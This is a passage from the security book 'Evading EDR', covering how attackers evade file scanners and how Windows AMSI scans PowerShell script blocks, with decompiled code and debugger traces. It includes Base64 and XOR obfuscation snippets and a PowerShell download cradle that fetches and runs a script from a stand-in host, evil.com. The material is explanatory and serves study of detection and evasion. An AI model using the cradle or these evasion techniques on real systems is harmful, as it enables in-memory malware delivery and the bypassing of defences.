the case of SafetyKatz’s use of dbghelp!MiniDumpWriteDump(), which requires 
the memory dump to be written to a file. In these situations, it’s important 
for attackers to limit the exposure of their files. This most commonly means 
immediately retrieving a copy of the files and removing them from the tar-
get, obscuring filenames and paths, or protecting the content of the file in 
some way.
While potentially less sophisticated than other sensors, scanners play 
an important part in detecting malicious content on the host. This chapter 
covers only file-based scanners, but commercial projects frequently employ 
other types, including network-based and memory scanners. At an enter-
prise scale, scanners can also offer interesting metrics, such as whether a 
file is globally unique. They present a particular challenge for adversaries 
and serve as a great representation of evasion in general. You can think of 
them as black boxes through which adversary tooling passes; the adversary’s 
job is to modify the attributes within their control, namely the elements of 
their malware, to make it to the other end.
Conclusion
Scanners, especially those related to antivirus engines, are one of the first 
defensive technologies many of us encounter. Though they fell out of favor 
due to the brittleness of their rulesets, they have recently regained popular-
ity as a supplemental feature, employing (at times) more robust rules than 
other sensors such as minifilters and image-load callback routines. Still, 
evading scanners is an exercise in obfuscation rather than avoidance. By 
changing indicators, even simple things like static strings, an adversary can 
usually fly under the radar of most modern scanning engines.
Evading EDR (Early Access) © 2023 by Matt Hand
Evading EDR (Early Access) © 2023 by Matt Hand
As security vendors began building effec-
tive tools for detecting the deployment and 
execution of compiled malware, attackers 
were left searching for alternative methods to 
execute their code. One of the tactics they discovered 
is the creation of script-based, or fileless, malware, 
which relies on the use of tools built into the operating 
system to execute code that will give the attacker con-
trol over the system.
To help protect users against these novel threats, Microsoft introduced 
the Antimalware Scan Interface (AMSI) with the release of Windows 10. AMSI 
provides an interface that allows application developers to leverage antimal-
ware providers registered on the system when determining if the data with 
which they are working is malicious.
AMSI is an omnipresent security feature in today’s operating envi-
ronments. Microsoft has instrumented many of the scripting engines, 
10
A N T IM A LWA R E SC A N IN T E R FACE
Evading EDR (Early Access) © 2023 by Matt Hand
184   Chapter 10
frameworks, and applications that we, as attackers, routinely target. 
Nearly every EDR vendor ingests events from AMSI, and some go so far 
as to attempt to detect attacks that tamper with the registered providers. 
This chapter covers the history of AMSI, its implementation in different 
Windows components, and the diverse world of AMSI evasions.
The Challenge of Script-Based Malware
Scripting languages offer a large number of advantages over compiled 
languages. They require less development time and overhead, bypass appli-
cation allow-listing, can execute in memory, and are portable. They also 
provide the ability to use the features of frameworks such as .NET and, 
oftentimes, direct access to the Win32 API, which greatly extends the func-
tionality of the scripting language.
While script-based malware existed in the wild prior to AMSI’s cre-
ation, the 2015 release of Empire, a command-and-control framework 
built around PowerShell, made its use mainstream in the offensive world. 
Because of its ease of use, default integration into Windows 7 and above, 
and large amount of existing documentation, PowerShell became the de 
facto language for offensive tool development for many.
This boom in script-based malware caused a large defensive gap. 
Previous tools relied on the fact that malware would be dropped to 
disk and executed. They fell short when faced with malware that ran a 
Microsoft-signed executable installed on the system by default, some-
times referred to as living-off-the-land, such as PowerShell. Even agents 
that attempted to detect the invocation of malicious scripts struggled, as 
attackers could easily adapt their payloads and tools to evade the detec-
tion techniques employed by vendors. Microsoft itself highlights this 
problem in its blog post announcing AMSI, which provides the follow-
ing example. Say that a defensive product searched a script for the string 
“malware” to determine whether it was malicious. It would detect the fol-
lowing code:
PS > Write-Host "malware";
Once malware authors became aware of this detection logic, they 
could bypass the detection mechanism using something as simple as string 
concatenation:
PS > Write-Host "mal" + "ware";
To combat this, developers would attempt some basic type of language 
emulation. For example, they might concatenate strings before scanning 
the contents of the script block. Unfortunately, this approach is prone to 
error, as languages often have many different ways to represent data, and 
cataloging them all for emulation is very difficult. Antimalware developers 
did have some success with the technique, however. As a result, malware 
Evading EDR (Early Access) © 2023 by Matt Hand
Antimalware Scan Interface   185
developers raised the complexity of their obfuscation slightly with tech-
niques such as encoding. The example in Listing 10-1 shows the string “mal-
ware” encoded using Base64 in PowerShell.
PS > $str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(
>> "bWFsd2FyZQ=="));
PS > Write-Host $str;
Listing 10-1: Decoding a Base64 string in PowerShell
Agents again leveraged language emulation to decode data in the script 
and scan it for malicious content. To combat this success, malware develop-
ers moved from simple encoding to encryption and algorithmic encoding, 
such as with exclusive-or (XOR). For example, the code in Listing 10-2 first 
decodes the Base64-encoded data and then uses the two-byte key gg to XOR 
the decoded bytes.
$key = "gg"
$data = "CgYLEAYVAg=="
$bytes = [System.Convert]::FromBase64String($data);
$decodedBytes = @();
for ($i = 0; $i -lt $bytes.Count; $i++) {
$decodedBytes += $bytes[$i] -bxor $key[$i % $key.Length];
}
$payload = [system.Text.Encoding]::UTF8.getString($decodedBytes);
Write-Host $payload;
Listing 10-2: An XOR example in PowerShell
This trend toward encryption exceeded what the antimalware engines 
could reasonably emulate, so detections based on the presence of the obfus-
cation techniques themselves became commonplace. This presents its own 
challenges, due to the fact that normal, benign scripts sometimes employ 
what may look like obfuscation. The example Microsoft put forward in its 
post, and one that became the standard for executing PowerShell code in 
memory, is the download cradle in Listing 10-3.
PS > Invoke-Expression (New-Object Net.Webclient).
>> downloadstring("https://evil.com/payloadl.ps1")
Listing 10-3: A simple PowerShell download cradle
In this example, the .NET Net.Webclient class is used to download a 
PowerShell script from an arbitrary site. When this script is downloaded, 
it isn’t written to disk but rather lives as a string in memory tied to the 
Webclient object. From here, the adversary uses the Invoke-Expression cmdlet 
to run this string as a PowerShell command. This technique results in what-
ever action the payload may take, such as deploying a new command-and-
control agent, occurring entirely in memory.
Evading EDR (Early Access) © 2023 by Matt Hand
186   Chapter 10
How AMSI Works
AMSI scans a target, then uses antimalware providers registered on the sys-
tem to determine whether it is malicious. By default, it uses the antimalware 
provider Microsoft Defender IOfficeAntivirus (MpOav.dll), but third-party 
EDR vendors may also register their own providers. Duane Michael main-
tains a list of security vendors who register AMSI providers in his “whoamsi” 
project on GitHub.
You’ll most commonly find AMSI used by applications that include 
scripting engines (for example, those that accept arbitrary scripts and 
execute them using the associated engine), work with untrusted buffers 
in memory, or interact with non-PE executable code, such as .docx and .pdf 
files. AMSI is integrated into many Windows components, including mod-
ern versions of PowerShell, .NET, JavaScript, VBScript, Windows Script 
Host, Office VBA macros, and User Account Control. It is also integrated 
into Microsoft Exchange.
Exploring PowerShell’s AMSI Implementation
Because PowerShell is open source, we can examine its AMSI implementa-
tion to understand how Windows components use this tool. In this section, 
we explore how AMSI attempts to restrict this application from executing 
malicious scripts.
Inside System.Management.Automation.dll, the DLL that provides the 
runtime for hosting PowerShell code, there exists a non-exported func-
tion called PerformSecurityChecks() that is responsible for scanning the sup-
plied script block and determining whether it is malicious. This function 
is called by the command processor created by PowerShell as part of the 
execution pipeline just before compilation. The call stack in Listing 10-4, 
captured in dnSpy, demonstrates the path the script block follows until it 
is scanned.
System.Management.Automation.dll!CompiledScriptBlockData.PerformSecurityChecks()
System.Management.Automation.dll!CompiledScriptBlockData.ReallyCompile(bool optimize)
System.Management.Automation.dll!CompiledScriptBlockData.CompileUnoptimized()
System.Management.Automation.dll!CompiledScriptBlockData.Compile(bool optimized)
System.Management.Automation.dll!ScriptBlock.Compile(bool optimized)
System.Management.Automation.dll!DlrScriptCommandProcessor.Init()
System.Management.Automation.dll!DlrScriptCommandProcessor.DlrScriptCommandProcessor(Script
Block scriptBlock, ExecutionContext context, bool useNewScope, CommandOrigin origin,
SessionStateInternal sessionState, object dollarUnderbar)
System.Management.Automation.dll!Runspaces.Command.CreateCommandProcessor(ExecutionContext
executionContext, bool addToHistory, CommandOrigin origin)
System.Management.Automation.dll!Runspaces.LocalPipeline.CreatePipelineProcessor()
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeHelper()
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeThreadProc()
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeThreadProcImpersonate()
System.Management.Automation.dll!Runspaces.PipelineThread.WorkerProc()
System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.RunWorker()
System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.Callback(object state)
System.Private.CoreLib.dll!System.Threading.ExecutionContext.RunInternal(--snip--)
Evading EDR (Early Access) © 2023 by Matt Hand
Antimalware Scan Interface   187
System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.Run()
System.Private.CoreLib.dll!System.Threading.Thread.StartCallback()
[Native to Managed Transition]
Listing 10-4: The call stack during the scanning of a PowerShell script block
When invoked, this function calls an internal utility, AmsiUtils 
.ScanContent(), passing in the script block or file to be scanned. This utility 
is a simple wrapper for another internal function, AmsiUtils.WinScanContent(), 
where all the real work takes place.
After checking the script block for the European Institute for 
Computer Antivirus Research (EICAR) test string, which all antiviruses 
must detect, WinScanContent’s first action is to create a new AMSI session via 
a call to amsi!AmsiOpenSession(). AMSI sessions are used to correlate multiple 
scan requests. Next, WinScanContent() calls amsi!AmsiScanBuffer(), the Win32 
API function that will invoke the AMSI providers registered on the system 
and return the final determination regarding the maliciousness of the 
script block. Listing 10-5 shows this implementation in PowerShell, with the 
irrelevant bits trimmed.
lock (s_amsiLockObject)
{
--snip--
if (s_amsiSession == IntPtr.Zero)
{
1 hr = AmsiNativeMethods.AmsiOpenSession(
s_amsiContext,
ref s_amsiSession
);
AmsiInitialized = true;
if (!Utils.Succeeded(hr))
{
 s_amsiInitFailed = true;
 return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
}
}
--snip--
AmsiNativeMethods.AMSI_RESULT result =
AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_CLEAN;
unsafe
{
fixed (char* buffer = content)
{
var buffPtr = new IntPtr(buffer);
2 hr = AmsiNativeMethods.AmsiScanBuffer(
s_amsiContext,
buffPtr,
(uint)(content.Length * sizeof(char)),
Evading EDR (Early Access) © 2023 by Matt Hand
188   Chapter 10
sourceMetadata,
s_amsiSession,
ref result);
}
}
if (!Utils.Succeeded(hr))
{
return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
}
return result;
}
Listing 10-5: PowerShell’s AMSI implementation
In PowerShell’s implementation, the code first calls 
amsi!AmsiOpenSession() 1 to create a new AMSI session in which scan 
requests can be correlated. If the session opens successfully, the data to be 
scanned is passed to amsi!AmsiScanBuffer() 2, which does the actual evalu-
ation of the data to determine if the contents of the buffer appear to be 
malicious. The result of this call is returned to WinScanContent().
The WinScanContent() function can return one of three values:
AMSI_RESULT_NOT_DETECTED  A neutral result
AMSI_RESULT_CLEAN  A result indicating that the script block did not con-
tain malware
AMSI_RESULT_DETECTED  A result indicating that the script block contained 
malware
If either of the first two results is returned, indicating that AMSI 
could not determine the maliciousness of the script block or found 
it not to be dangerous, the script block will be allowed to execute on 
the system. If, however, the AMSI_RESULT_DETECTED result is returned, a 
ParseException will be thrown, and execution of the script block will 
be halted. Listing 10-6 shows how this logic is implemented inside 
PowerShell.
if (amsiResult == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
{
var parseError = new ParseError(
scriptExtent,
"ScriptContainedMaliciousContent",
ParserStrings.ScriptContainedMaliciousContent);
 1 throw new ParseException(new[] { parseError });
}
Listing 10-6: Throwing a ParseError on malicious script detection
Because AMSI threw an exception 1, the execution of the script halts 
and the error shown in the ParseError will be returned to the user.  
Listing 10-7 shows the error the user will see in the PowerShell window.
Evading EDR (Early Access) © 2023 by Matt Hand
Antimalware Scan Interface   189
PS > Write-Host "malware"
ParserError:
Line |
   1 |  Write-Host "malware"
|  ~~~~~~~~~~~~~~~~~~~~
| This script contains malicious content and has been blocked by your
| antivirus software.
Listing 10-7: The thrown error shown to the user
Understanding AMSI Under the Hood
While understanding how AMSI is instrumented in system components 
provides useful context for how user-supplied input is evaluated, it 
doesn’t quite tell the whole story. What happens when PowerShell calls 
amsi!AmsiScanBuffer()? To understand this, we must dive deep into the AMSI 
implementation itself. Because the state of C++ decompilers at the time 
of this writing makes static analysis a bit tricky, we’ll need to use some 
dynamic analysis techniques. Thankfully, WinDbg makes this process rela-
tively painless, especially considering that debug symbols are available for 
amsi.dll.
When PowerShell starts, it first calls amsi!AmsiInitialize(). As its name 
suggests, this function is responsible for initializing the AMSI API. This ini-
tialization primarily centers on the creation of a COM class factory via a call 
to DllGetClassObject(). As an argument, it receives the class identifier cor-
relating to amsi.dll, along with the interface identified for the IClassFactory, 
which enables a class of objects to be created. The interface pointer is then 
used to create an instance of the IAntimalware interface ({82d29c2e-f062-44e6 
-b5c9-3d9a2f24a2df}), shown in Listing 10-8.
Breakpoint 4 hit
amsi!AmsiInitialize+0x1a9:
00007ff9`5ea733e9 ff15899d0000 call qword ptr [amsi!_guard_dispatch_icall_fptr ] --snip--
0:011> dt OLE32!IID @r8
 {82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}
 +0x000 Data1  
: 0x82d29c2e
 +0x004 Data2  
: 0xf062
 +0x006 Data3  
: 0x44e6
 +0x008 Data4  
: [8] "???"
0:011> dt @rax
ATL::CComClassFactory::CreateInstance
Listing 10-8: Creating an instance of IAntimalware
Rather than an explicit call to some functions, you’ll occasionally find 
references to _guard_dispatch_icall_fptr(). This is a component of Control 
Flow Guard (CFG), an anti-exploit technology that attempts to prevent indi-
rect calls, such as in the event of return-oriented programming. In short, 
Evading EDR (Early Access) © 2023 by Matt Hand
190   Chapter 10
this function checks the Control Flow Guard bitmap of the source image 
to determine if the function to be called is a valid target. In the context of 
this section, the reader can treat these as simple CALL instructions to reduce 
confusion.
This call then eventually leads into amsi!AmsiComCreateProviders 
, where all the magic happens. Listing 10-9 shows the 
call stack for this method inside WinDbg.
0:011> kc
 # Call Site
00 amsi!AmsiComCreateProviders
01 amsi!CamsiAntimalware::FinalConstruct
02 amsi!ATL::CcomCreator >::CreateInstance
03 amsi!ATL::CcomClassFactory::CreateInstance
04 amsi!AmsiInitialize
Listing 10-9: The call stack for the AmsiComCreateProviders function
The first major action is a call to amsi!CGuidEnum::StartEnum(). This 
function receives the string "Software\\Microsoft\\AMSI\\Providers", which it 
passes into a call to RegOpenKey() and then RegQueryInfoKeyW() in order to get 
the number of subkeys. Then, amsi!CGuidEnum::NextGuid() iterates through 
the subkeys and converts the class identifiers of registered AMSI providers 
from strings to UUIDs. After enumerating all the required class identi-
fiers, it passes execution to amsi!AmsiComSecureLoadInProcServer(), where the 
InProcServer32 value corresponding to the AMSI provider is queried via 
RegGetValueW(). Listing 10-10 shows this process for MpOav.dll.
0:011> u @rip L1
amsi!AmsiComSecureLoadInProcServer+0x18c: